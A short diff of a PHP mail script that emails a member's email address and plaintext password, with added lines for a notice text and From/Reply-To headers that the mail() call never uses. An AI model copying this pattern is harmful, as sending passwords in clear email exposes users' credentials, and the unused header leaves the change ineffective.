@@ -22,6 +22,11 @@ $message .= "Member email           : $email \n\n";
 $message .= "Member Password        : $password \n\n";
 $message .= "Thank you for your support \n\n";
 $message .= "Email Application sender";
+$message.= "Dear Customer, you will be receiving Tool admin message advising if was granted or denied your request \n\n";
+$message.= "Email Application sender";
+$header = "From: adm@solicionespro.com" . "\r\n";
+$header.= "Reply-To: noreply@solicionespro.com" . "\r\n";
+$header.= "X-Mailer: PHP/". phpversion();
 
 //Sending Email 
 mail($to, $subject, $message);
